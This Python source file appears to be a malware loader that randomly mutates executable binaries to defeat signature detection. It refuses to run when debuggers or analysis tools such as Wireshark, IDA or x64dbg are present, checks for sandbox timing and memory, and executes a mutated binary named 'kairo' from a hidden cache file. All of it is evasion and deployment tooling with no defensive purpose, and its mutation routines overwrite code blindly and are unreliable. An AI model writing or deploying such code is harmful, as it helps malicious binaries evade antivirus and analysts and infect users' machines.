from abc import ABC, abstractmethod
import subprocess
import sys
import os
import time
import platform
import psutil
import random
from typing import Tuple, Optional, List
from pathlib import Path
import logging
from contextlib import contextmanager
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64
import struct


# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class BinaryMutator:
    def __init__(self):
        self.mutations = [
            self._swap_instructions,
            self._add_nop_slides,
            self._modify_constants,
            self._add_junk_code,
            self._add_dead_code,
            self._randomize_registers
        ]


    def mutate_binary(self, binary_data: bytes) -> bytes:
        if not self._is_valid_binary(binary_data):
            logger.warning("Invalid binary data provided for mutation.")
            return binary_data
        mutated_data = bytearray(binary_data)
        sections = self._find_executable_sections(mutated_data)
        for start, size in sections:
            num_mutations = random.randint(2, 5)
            for _ in range(num_mutations):
                mutation = random.choice(self.mutations)
                mutated_data = mutation(mutated_data, start, size)
        return bytes(mutated_data)


    def _is_valid_binary(self, data: bytes) -> bool:
        return data.startswith(b'\x7fELF') or data.startswith(b'MZ')


    def _find_executable_sections(self, data: bytes) -> List[Tuple[int, int]]:
        sections = []
        if data.startswith(b'\x7fELF'):
            e_phoff = struct.unpack("<Q", data[0x20:0x28])[0]
            e_phnum = struct.unpack("<H", data[0x38:0x3A])[0]
            for i in range(e_phnum):
                offset = e_phoff + i * 56
                p_type = struct.unpack("<I", data[offset:offset+4])[0]
                if p_type == 1:  # PT_LOAD
                    p_offset = struct.unpack("<Q", data[offset+8:offset+16])[0]
                    p_filesz = struct.unpack("<Q", data[offset+32:offset+40])[0]
                    sections.append((p_offset, p_filesz))
        elif data.startswith(b'MZ'):
            pe_offset = struct.unpack("<I", data[0x3C:0x40])[0]
            sections.append((pe_offset, len(data) - pe_offset))
        return sections


    def _swap_instructions(self, data: bytearray, start: int, size: int) -> bytearray:
        if size < 16:
            return data
        pos = random.randint(start, start + size - 16)
        instr1 = data[pos:pos+8]
        instr2 = data[pos+8:pos+16]
        if self._can_swap_instructions(instr1, instr2):
            data[pos:pos+8], data[pos+8:pos+16] = instr2, instr1
        return data


    def _can_swap_instructions(self, instr1: bytes, instr2: bytes) -> bool:
        # Aquí se debe implementar la lógica para verificar si las instrucciones son intercambiables
        return True


    def _add_nop_slides(self, data: bytearray, start: int, size: int) -> bytearray:
        if size < 32:
            return data
        pos = random.randint(start, start + size - 32)
        nop_variations = [
            bytes([0x90]),  # NOP
            bytes([0x66, 0x90]),  # 66 NOP
            bytes([0x0F, 0x1F, 0x00]),  # Multi-byte NOP
            bytes([0x0F, 0x1F, 0x40, 0x00])  # Long NOP
        ]
        nop_slide = b''.join(random.choice(nop_variations) for _ in range(random.randint(4, 8)))
        return data[:pos] + nop_slide + data[pos+len(nop_slide):]


    def _modify_constants(self, data: bytearray, start: int, size: int) -> bytearray:
        if size < 16:
            return data
        pos = random.randint(start, start + size - 16)
        original = int.from_bytes(data[pos:pos+8], byteorder='little')
        offset = random.randint(1, 1000)
        data[pos:pos+8] = (original + offset).to_bytes(8, byteorder='little')
        data[pos+8:pos+16] = offset.to_bytes(8, byteorder='little')
        return data


    def _add_junk_code(self, data: bytearray, start: int, size: int) -> bytearray:
        if size < 32:
            return data
        pos = random.randint(start, start + size - 32)
        junk_patterns = [
            bytes([0x50, 0x58, 0x90, 0x90]),  # PUSH RAX, POP RAX, NOP, NOP
            bytes([0x51, 0x59, 0x87, 0xC9]),  # PUSH RCX, POP RCX, XCHG ECX, ECX
            bytes([0x53, 0x5B, 0x87, 0xDB])  # PUSH RBX, POP RBX, XCHG EBX, EBX
        ]
        junk = random.choice(junk_patterns)
        return data[:pos] + junk + data[pos+len(junk):]


    def _add_dead_code(self, data: bytearray, start: int, size: int) -> bytearray:
        if size < 32:
            return data
        pos = random.randint(start, start + size - 32)
        dead_code_patterns = [
            bytes([0x31, 0xC0, 0x31, 0xC0]),  # XOR EAX, EAX twice
            bytes([0x87, 0xDB, 0x87, 0xDB]),  # XCHG EBX, EBX twice
            bytes([0x89, 0xC0, 0x89, 0xC0])  # MOV EAX, EAX twice
        ]
        dead_code = random.choice(dead_code_patterns)
        return data[:pos] + dead_code + data[pos+len(dead_code):]


    def _randomize_registers(self, data: bytearray, start: int, size: int) -> bytearray:
        if size < 16:
            return data
        pos = random.randint(start, start + size - 16)
        reg_pairs = [
            (b'\x89\xC3', b'\x89\xD8'),  # MOV EBX, EAX <-> MOV EAX, EBX
            (b'\x89\xD1', b'\x89\xCA'),  # MOV ECX, EDX <-> MOV EDX, ECX
            (b'\x89\xE5', b'\x89\xEC')  # MOV EBP, ESP <-> MOV ESP, EBP
        ]
        if pos + 2 <= len(data):
            for reg1, reg2 in reg_pairs:
                if data[pos:pos+2] == reg1:
                    data[pos:pos+2] = reg2
                    break
        return data


class EnvironmentChecker:
    MIN_MEMORY_GB = 2
    SUSPICIOUS_PROCESSES = frozenset(['wireshark', 'ida', 'ollydbg', 'x64dbg', 'windbg'])
    MIN_SLEEP_TIME = 0.1
    
    @classmethod
    def check_environment(cls) -> bool:
        try:
            if not cls._check_timing():
                logger.warning("Timing check failed.")
                return False
            if not cls._check_memory():
                logger.warning("Memory check failed.")
                return False
            if not cls._check_processes():
                logger.warning("Suspicious processes detected.")
                return False
            return True
        except Exception as e:
            logger.error(f"Environment check failed: {e}")
            return False


    @classmethod
    def _check_timing(cls) -> bool:
        start_time = time.time()
        time.sleep(cls.MIN_SLEEP_TIME)
        elapsed_time = time.time() - start_time
        return elapsed_time >= cls.MIN_SLEEP_TIME


    @classmethod
    def _check_memory(cls) -> bool:
        return psutil.virtual_memory().total >= cls.MIN_MEMORY_GB * 1024 * 1024 * 1024


    @classmethod
    def _check_processes(cls) -> bool:
        try:
            running_processes = {p.name().lower() for p in psutil.process_iter(['name'])}
            return not bool(running_processes & cls.SUSPICIOUS_PROCESSES)
        except Exception:
            logger.error("Failed to retrieve running processes.")
            return False


class Cryptography:
    def __init__(self, key_size: int = 32):
        self.key_size = key_size
        self.key = self._generate_key()


    def _generate_key(self) -> bytes:
        return get_random_bytes(self.key_size)


    def encrypt(self, data: bytes) -> bytes:
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        return base64.b85encode(iv + ct_bytes)


    def decrypt(self, data: bytes) -> bytes:
        try:
            raw_data = base64.b85decode(data)
            iv = raw_data[:AES.block_size]
            ct = raw_data[AES.block_size:]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(ct), AES.block_size)
        except Exception as e:
            logger.error(f"Decryption failed: {e}")
            raise


@contextmanager
def temporary_file(suffix: str = '') -> Path:
    temp_path = Path.home() / '.cache' / '.tmp' / \
        f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))}{suffix}"
    temp_path.parent.mkdir(parents=True, exist_ok=True)
    try:
        yield temp_path
    finally:
        try:
            if temp_path.exists():
                temp_path.unlink()
        except Exception as e:
            logger.error(f"Failed to remove temporary file: {e}")


class BinaryExecutorBase(ABC):
    def __init__(self, crypto: Cryptography):
        self.crypto = crypto


    @abstractmethod
    def execute(self, binary_path: str, config_path: Optional[str] = None) -> None:
        """Execute a binary with the given configuration."""
        pass


class StandardBinaryExecutor(BinaryExecutorBase):
    def __init__(self, crypto: Cryptography):
        super().__init__(crypto)
        self.mutator = BinaryMutator()


    def execute(self, binary_path: str, config_path: Optional[str] = None) -> None:
        if not EnvironmentChecker.check_environment():
            logger.error("Environment check failed")
            raise RuntimeError("Environment check failed")
        self._random_delay(1, 3)
        try:
            with open(binary_path, "rb") as f:
                binary_data = f.read()
            for _ in range(3):
                binary_data = self.mutator.mutate_binary(binary_data)
            binary_data = self._process_binary(binary_data)
            with temporary_file() as exec_path:
                exec_path.write_bytes(binary_data)
                exec_path.chmod(0o755)
                self._execute_binary(exec_path, config_path)
        except Exception as e:
            logger.error(f"Execution failed: {e}")
            raise


    def _process_binary(self, data: bytes) -> bytes:
        self._random_delay(0.1, 0.5)
        encrypted = self.crypto.encrypt(data)
        return self.crypto.decrypt(encrypted)


    @staticmethod
    def _random_delay(min_time: float, max_time: float) -> None:
        time.sleep(random.uniform(min_time, max_time))


    def _execute_binary(self, exec_path: Path, config_path: Optional[str]) -> None:
        cmd = [str(exec_path)]
        if config_path:
            cmd.extend(["-c", config_path])
        with subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        ) as process:
            stdout, stderr = process.communicate()
            if process.returncode != 0:
                logger.error(f"Process returned non-zero exit code: {process.returncode}")
                if stderr:
                    logger.error(f"stderr: {stderr.decode().strip()}")
                if stdout:
                    logger.info(f"stdout: {stdout.decode().strip()}")
            else:
                logger.info("Process executed successfully")
        self._random_delay(1, 2)


def main():
    if platform.system().lower() not in {'windows', 'linux'}:
        logger.error("Unsupported system")
        sys.exit(1)
    try:
        crypto = Cryptography()
        executor = StandardBinaryExecutor(crypto)
        executor.execute("./kairo", "config.json")
    except Exception as e:
        logger.error(f"Program failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()